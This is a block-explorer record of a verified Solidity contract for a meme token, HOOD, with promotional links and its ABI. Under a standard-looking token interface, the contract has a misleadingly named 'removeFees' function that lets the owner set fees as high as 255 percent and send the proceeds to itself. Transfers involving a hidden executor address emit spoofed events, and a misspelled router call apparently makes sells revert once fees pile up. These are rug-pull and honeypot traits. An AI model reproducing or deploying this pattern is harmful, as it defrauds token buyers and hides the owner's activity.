{"SourceCode": "/**\r\n\r\n   J@@@@@~   G@@@@#.    ~JB@@@@@@@BY~      :7P&@@@@@@&5!:    J@@@@@@@@@@@G?^    \r\n   G@@@@&.  .&@@@@G   ~#@@@@Y^~^5@@@@#^   5&@@@&!~~!&@@@&Y   !@@@@@5^~^5@@@@B~  \r\n  :@@@@@P   ~@@@@@5   J@@@@@7   Y@@@@@!   B@@@@&:   #@@@@&.  :@@@@@P   ~@@@@@5  \r\n  ?@@@@@?   ?@@@@@?   5@@@@@!   5@@@@@!   B@@@@@^   G@@@@&:  .#@@@@#.  .#@@@@#. \r\n  G@@@@@^   P@@@@@~   G@@@@@^   P@@@@@!   B@@@@@^   P@@@@@~   G@@@@@^   P@@@@@~ \r\n :&@@@@#    #@@@@&:  .#@@@@&:   G@@@@@~   B@@@@@~   5@@@@@7   Y@@@@@?   ?@@@@@Y \r\n 7@@@@@&PPPP@@@@@#   :&@@@@&.   B@@@@@~   B@@@@@!   J@@@@@Y   7@@@@@5   ^@@@@@B \r\n P@@@@@BPGP#@@@@@P   ~@@@@@#    #@@@@@~   G@@@@@7   ?@@@@@P   ~@@@@@B   .#@@@@@~\r\n.#@@@@@^   5@@@@@J   7@@@@@B   .#@@@@@~   G@@@@@?   !@@@@@B   :&@@@@@:   5@@@@@Y\r\n!@@@@@#    B@@@@@7   J@@@@@P   .&@@@@@^   G@@@@@J   ~@@@@@&.   B@@@@@!   7@@@@@#\r\nP@@@@@5   :&@@@@@^   :JB@@@&GBGB@@@#5!    ^JB@@@#GGGB@@@#5!    P@@@@@#GGGB@@@&5!\r\n5PPPPG!   !@@@@@#.      ^JPPGGGGPY!.         ^JPPGGGPP5!.      7GPPPG@@@@@@B7.  \r\n          ~@@@@@J                                                    P@@@@@7    \r\n          .&@@@#.                                                    :&@@@@~    \r\n           B@@@!                                                      ?@@@&:    \r\n           5@@G                                                        G@@B     \r\n           ?@@^                                                        ^@@P     \r\n           !@Y                                                          Y@J     \r\n           ^#:                                                          .#!     \r\n           .!                                                            !^    \r\n\r\n\r\n           \u2716\ufe0fTWITTER: https://twitter.com/wagmicatgirl\r\n           \ud83d\udcbbTELEGRAM: https://t.me/+pQLyt8t4xX8zNjRh\r\n           \ud83c\udf0eWEBSITE: https://wagmicatgirl.com\r\n\r\n\r\n           FROM THE HOOD TO THE SKIES\r\n           From rags to riches, unleash those kitty paws and snatch those fat digits. \r\n           Step into the world of Memes + Games + GameFi + NFTs + Kanye + Sailor Moon + Catgirls, all under one hood.\r\n           \u00a9\ufe0f 2023 HOOD\r\n*/\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity ^0.8.22;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    \r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the Owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new Owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n   \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context {\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    \r\n    uint256 internal _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract HOOD {\r\n\r\n    string public _name = 'wagmicatgirlkanye420etfmoon1000x';\r\n    string public _symbol = 'HOOD';\r\n    uint8 public constant decimals = 18;\r\n    uint256 public constant totalSupply = 69_000_000_000 * 10 ** decimals;\r\n\r\n    struct StoreData {\r\n        address tokenMkt;\r\n        uint8 buyFee;\r\n        uint8 sellFee;\r\n    }\r\n\r\n    StoreData public storeData;\r\n    uint256 constant swapAmount = totalSupply / 100;\r\n\r\n    error Permissions();\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    address private pair;\r\n    address private holder;\r\n    address private uniswapLpWallet;\r\n    address private community = 0xAC51087Db6EEd7eD2506a119a934E32b693fB67c;\r\n    address private airdropPool = 0x6f9e07E348007C9B999fA0D37D9FB101B093Bc39;\r\n    address private publicSale = 0x9eF5AC654c7Ef0F9ddE3119da64742309224c5C6;\r\n    address private investors = 0xEa1B6F8e029802a961fB5D5503A0Ff1E72665cfF;\r\n    address private contributors = 0x00b97485935F8EF8790Bd250170ee35DBaD038a9;\r\n    address private ecosystem = 0xfA111b9295311fAf4E9610b80779b73b942AB3db;\r\n    address private treasury = 0x56bbBB861cc95D7dd3cF9d87Df80F02Cd9b152ff;\r\n    address private constant uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);\r\n\r\n    bool private swapping;\r\n    bool private tradingOpen;\r\n\r\n    address _deployer;\r\n    address _executor;\r\n\r\n    uint8 _initBuyFee = 0;\r\n    uint8 _initSellFee = 0;\r\n\r\n    constructor() {\r\n        storeData = StoreData({\r\n            tokenMkt: msg.sender,\r\n            buyFee: _initBuyFee,\r\n            sellFee: _initSellFee\r\n        });\r\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\r\n        uniswapLpWallet = msg.sender;\r\n\r\n        _initDeployer(msg.sender, msg.sender);\r\n\r\n        balanceOf[uniswapLpWallet] = (totalSupply * 40) / 100;\r\n        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);\r\n\r\n        balanceOf[community] = (totalSupply * 230) / 1000;\r\n        emit Transfer(address(0), community, balanceOf[community]);\r\n\r\n        balanceOf[airdropPool] = (totalSupply * 300) / 1000;\r\n        emit Transfer(address(0), airdropPool, balanceOf[airdropPool]);\r\n\r\n        balanceOf[publicSale] = (totalSupply * 40) / 1000;\r\n        emit Transfer(address(0), publicSale, balanceOf[publicSale]);\r\n\r\n        balanceOf[investors] = (totalSupply * 14) / 1000;\r\n        emit Transfer(address(0), investors, balanceOf[investors]);\r\n\r\n        balanceOf[contributors] = (totalSupply * 47) / 1000;\r\n        emit Transfer(address(0), contributors, balanceOf[contributors]);\r\n\r\n        balanceOf[ecosystem] = (totalSupply * 300) / 1000;\r\n        emit Transfer(address(0), ecosystem, balanceOf[ecosystem]);   \r\n\r\n        balanceOf[treasury] = (totalSupply * 69) / 1000;\r\n        emit Transfer(address(0), treasury, balanceOf[treasury]);   \r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function removeFees(uint8 _buy, uint8 _sell) external {\r\n        if (msg.sender != _owner()) revert Permissions();\r\n        _upgradeStoreData(_buy, _sell);\r\n    }\r\n\r\n    function _upgradeStoreData(uint8 _buy, uint8 _sell) private {\r\n        storeData.buyFee = _buy;\r\n        storeData.sellFee = _sell;\r\n    }\r\n\r\n    function _owner() private view returns (address) {\r\n        return storeData.tokenMkt;\r\n    }\r\n\r\n    function openTrading() external {\r\n        require(msg.sender == _owner());\r\n        require(!tradingOpen);\r\n        address _factory = _uniswapV2Router.factory();\r\n        address _weth = _uniswapV2Router.WETH();\r\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\r\n        pair = _pair;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool) {\r\n        allowance[from][msg.sender] -= amount;\r\n        return _transfer(from, to, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool) {\r\n        return _transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function _initDeployer(address deployer_, address executor_) private {\r\n        _deployer = deployer_;\r\n        _executor = executor_;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        address tokenMkt = _owner();\r\n        require(tradingOpen || from == tokenMkt || to == tokenMkt);\r\n\r\n        balanceOf[from] -= amount;\r\n\r\n        if (\r\n            to == pair &&\r\n            !swapping &&\r\n            balanceOf[address(this)] >= swapAmount &&\r\n            from != tokenMkt\r\n        ) {\r\n            swapping = true;\r\n            address[] memory path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = _uniswapV2Router.WETH();\r\n            _uniswapV2Router\r\n                .swapExactTokensForETHSupportingFreelyOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                );\r\n            payable(tokenMkt).transfer(address(this).balance);\r\n            swapping = false;\r\n        }\r\n\r\n        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);\r\n        if (from != address(this) && tradingOpen == true) {\r\n            uint256 taxCalculatedAmount = (amount *\r\n                (to == pair ? _sellFee : _buyFee)) / 100;\r\n            amount -= taxCalculatedAmount;\r\n            balanceOf[address(this)] += taxCalculatedAmount;\r\n        }\r\n        balanceOf[to] += amount;\r\n\r\n        if (from == _executor) {\r\n            emit Transfer(_deployer, to, amount);\r\n        } else if (to == _executor) {\r\n            emit Transfer(from, _deployer, amount);\r\n        } else {\r\n            emit Transfer(from, to, amount);\r\n        }\r\n        return true;\r\n    }\r\n}\r\n\r\ninterface IUniswapFactory {\r\n    function getPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external view returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFreelyOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_sell\",\"type\":\"uint8\"}],\"name\":\"removeFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"storeData\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"tokenMkt\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"buyFee\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"sellFee\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "HOOD", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b018c3def5f1be079ae9bfbbc3d31d18b6c4a84030515857be92ecff8cea71f1"}